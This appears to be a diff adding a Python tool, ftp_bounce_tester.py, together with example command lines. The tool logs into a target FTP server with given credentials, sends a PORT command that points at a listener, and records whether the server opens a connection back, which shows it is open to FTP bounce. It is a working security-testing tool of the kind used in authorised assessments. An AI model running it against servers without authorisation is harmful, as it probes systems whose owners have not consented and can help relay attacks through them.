@@ -1,0 +1,294 @@
+#!/usr/bin/env python3
+"""
+ftp_bounce_tester.py
+
+Advanced FTP bounce validator:
+- (optional) Starts a local listener on (listen_host, listen_port) unless --no-listen
+- Connects to target FTP server, logs in, sends PORT <listener_ip,port>
+- Triggers LIST to force the FTP server to open a data connection
+- Records whether the FTP server actually connected to the listener
+
+Usage examples:
+  # Use internal listener (default)
+  python3 ftp_bounce_tester.py \
+    --ftp 10.30.7.25 --user admin --pass admin \
+    --listen 169.254.131.67 --ports 10794,10800 \
+    --out results.csv --timeout 8 --retries 2 -v
+
+  # Use external listener (e.g. nc) and do not start internal listener
+  nc -lv -p 10794
+  python3 ftp_bounce_tester.py --ftp 10.30.7.25 --user admin --pass admin \
+    --listen 169.254.131.67 --ports 10794 --no-listen -v
+"""
+import argparse
+import csv
+import socket
+import threading
+import time
+from ftplib import FTP
+
+def ip_port_to_port_tuple(ip, port):
+    parts = ip.split('.')
+    if len(parts) != 4:
+        raise ValueError("IP must be IPv4 dotted quad")
+    p1 = port // 256
+    p2 = port % 256
+    return ','.join(parts + [str(p1), str(p2)])
+
+class Listener(threading.Thread):
+    def __init__(self, bind_host, bind_port, timeout=8, expected_src=None, verbose=False):
+        super().__init__(daemon=True)
+        self.bind_host = bind_host
+        self.bind_port = bind_port
+        self.timeout = timeout
+        self.expected_src = expected_src
+        self.verbose = verbose
+
+        self.connected = False
+        self.peer = None
+        self._stop_event = threading.Event()
+        self._sock = None
+        self._bind_error = None
+
+    def run(self):
+        if self.verbose:
+            print(f"[listener] starting on {self.bind_host}:{self.bind_port} (timeout {self.timeout}s)")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # allow quick reuse during debugging, but note this does not solve a simultaneous bind by another process
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            try:
+                s.bind((self.bind_host, self.bind_port))
+            except Exception as e:
+                # capture bind error and exit gracefully
+                self._bind_error = e
+                if self.verbose:
+                    print(f"[listener] bind error: {e}")
+                try:
+                    s.close()
+                except Exception:
+                    pass
+                return
+
+            s.listen(1)
+            s.settimeout(self.timeout)
+            self._sock = s
+            try:
+                conn, addr = s.accept()
+                self.peer = addr
+                self.connected = True
+                if self.verbose:
+                    print(f"[listener] accepted connection from {addr}")
+                # Optionally read a little (non-blocking) then close
+                try:
+                    conn.settimeout(1.0)
+                    _ = conn.recv(1024)
+                except Exception:
+                    pass
+                try:
+                    conn.close()
+                except Exception:
+                    pass
+            except socket.timeout:
+                if self.verbose:
+                    print(f"[listener] timeout waiting for connection on {self.bind_host}:{self.bind_port}")
+            except Exception as e:
+                if self.verbose:
+                    print(f"[listener] accept error: {e}")
+            finally:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+        finally:
+            # ensure socket is closed on exit
+            if self._sock:
+                try:
+                    self._sock.close()
+                except Exception:
+                    pass
+
+    def stop(self):
+        self._stop_event.set()
+        if self._sock:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+
+def test_bounce_once(ftp_host, ftp_user, ftp_pass, listen_ip, listen_port, timeout=8, verbose=False, no_listen=False):
+    """
+    Returns a dict: { 'ftp_host','listen_ip','listen_port','ftp_port_ok',
+                      'listener_connected','peer','err','listener_mode' }
+    """
+    result = {
+        'ftp_host': ftp_host,
+        'listen_ip': listen_ip,
+        'listen_port': listen_port,
+        'ftp_port_ok': False,
+        'listener_connected': False,
+        'peer': '',
+        'err': '',
+        'listener_mode': 'external' if no_listen else 'internal'
+    }
+
+    listener = None
+    if not no_listen:
+        listener = Listener(bind_host=listen_ip, bind_port=listen_port, timeout=timeout, verbose=verbose)
+        listener.start()
+        # small sleep to ensure listener is ready before we contact the FTP server
+        time.sleep(0.35)
+        # If listener thread recorded a bind error quickly, reflect that
+        if getattr(listener, '_bind_error', None):
+            err = listener._bind_error
+            result['err'] = f"listener bind failed: {err}"
+            if verbose:
+                print(f"[main] listener bind failed: {err}")
+            # stop listener (it already returned)
+            listener.stop()
+            # continue to attempt the FTP PORT command even if listener couldn't bind,
+            # so CSV reflects ftp_port_ok vs listener_connected
+    else:
+        if verbose:
+            print("[main] running in --no-listen (external listener expected) mode")
+
+    ftp = None
+    try:
+        if verbose:
+            print(f"[ftp] connecting to {ftp_host}:21")
+        ftp = FTP()
+        ftp.connect(ftp_host, 21, timeout=5)
+        ftp.login(ftp_user, ftp_pass)
+        if verbose:
+            print("[ftp] logged in, sending PORT")
+
+        port_arg = ip_port_to_port_tuple(listen_ip, listen_port)
+        resp = ftp.sendcmd("PORT " + port_arg)
+        result['ftp_port_ok'] = str(resp).startswith('200') or str(resp).startswith('250')
+        if verbose:
+            print(f"[ftp] PORT response: {resp}")
+
+        # Trigger the data connection that will use the PORT info
+        try:
+            # Use a short timeout for LIST; some servers may hang if they try connecting
+            ftp.sock.settimeout(timeout)
+            if verbose:
+                print("[ftp] issuing LIST to trigger data connection")
+            ftp.retrlines('LIST')   # will try to open data connection
+        except Exception as e:
+            # expected on many servers (they may close or fail)
+            if verbose:
+                print(f"[ftp] data command exception (expected in some cases): {e}")
+
+    except Exception as e:
+        result['err'] = result.get('err', '') + ((" | " + str(e)) if result.get('err') else str(e))
+        if verbose:
+            print(f"[ftp] error: {e}")
+    finally:
+        try:
+            if ftp:
+                ftp.quit()
+        except Exception:
+            try:
+                if ftp:
+                    ftp.close()
+            except Exception:
+                pass
+
+    # If we used an internal listener, wait for it to accept (listener will timeout internally)
+    if listener:
+        listener.join(timeout + 0.5)
+        result['listener_connected'] = listener.connected
+        result['peer'] = f"{listener.peer}" if listener.peer else ''
+        listener.stop()
+    else:
+        # external listener: we cannot confirm from here — leave listener_connected False
+        result['listener_connected'] = False
+        result['peer'] = ''
+
+    return result
+
+def main():
+    parser = argparse.ArgumentParser(description="Advanced FTP bounce validator")
+    parser.add_argument('--ftp', required=True, help="FTP server IP")
+    parser.add_argument('--user', required=True, help="FTP username")
+    parser.add_argument('--pass', dest='passwd', required=True, help="FTP password")
+    parser.add_argument('--listen', required=True, help="Listener IP (this machine's IP reachable by FTP server)")
+    parser.add_argument('--ports', required=True, help="Comma-separated ports to test on listener (e.g. 10794,10800)")
+    parser.add_argument('--timeout', type=int, default=8, help="Listener timeout (seconds)")
+    parser.add_argument('--retries', type=int, default=1, help="Retries per port")
+    parser.add_argument('--out', default='ftp_bounce_results.csv', help="CSV output file")
+    parser.add_argument('--no-listen', action='store_true', help="Do NOT start internal listener; assume you're running an external listener (nc) against the port")
+    parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
+    args = parser.parse_args()
+
+    ftp_host = args.ftp
+    ftp_user = args.user
+    ftp_pass = args.passwd
+    listen_ip = args.listen
+    ports = [int(p.strip()) for p in args.ports.split(',') if p.strip()]
+    timeout = args.timeout
+    retries = args.retries
+    verbose = args.verbose
+    no_listen = args.no_listen
+
+    results = []
+    for port in ports:
+        for attempt in range(1, retries+1):
+            if verbose:
+                print(f"\n=== Test {ftp_host} -> listener {listen_ip}:{port} (attempt {attempt}/{retries}) ===")
+            r = test_bounce_once(
+                ftp_host, ftp_user, ftp_pass,
+                listen_ip, port,
+                timeout=timeout, verbose=verbose, no_listen=no_listen
+            )
+            r['attempt'] = attempt
+            results.append(r)
+            # small delay between attempts
+            time.sleep(0.4)
+
+    # write CSV (added listener_mode column)
+    with open(args.out, 'w', newline='') as fh:
+        w = csv.DictWriter(fh, fieldnames=[
+            'ftp_host','listen_ip','listen_port','attempt',
+            'ftp_port_ok','listener_connected','peer','err','listener_mode'
+        ])
+        w.writeheader()
+        for row in results:
+            w.writerow({
+                'ftp_host': row['ftp_host'],
+                'listen_ip': row['listen_ip'],
+                'listen_port': row['listen_port'],
+                'attempt': row.get('attempt',1),
+                'ftp_port_ok': row['ftp_port_ok'],
+                'listener_connected': row['listener_connected'],
+                'peer': row['peer'],
+                'err': row['err'],
+                'listener_mode': row.get('listener_mode','internal')
+            })
+
+    print(f"\nDone. Results written to {args.out}")
+    if verbose:
+        for r in results:
+            print(r)
+
+if __name__ == '__main__':
+    main()
+
+
+
+
+
+
+python3 ftp_bounce_tester.py --ftp 10.30.7.25 --user admin --pass admin \
+  --listen 169.254.131.67 --ports 10794 --timeout 10 --retries 2 -v
+
+
+
+
+# On same host: listen on the port
+nc -lv -p 10794
+# In another terminal run the tester but do not bind an internal listener
+python3 ftp_bounce_tester.py --ftp 10.30.7.25 --user admin --pass admin \
+  --listen 169.254.131.67 --ports 10794 --no-listen -v
+
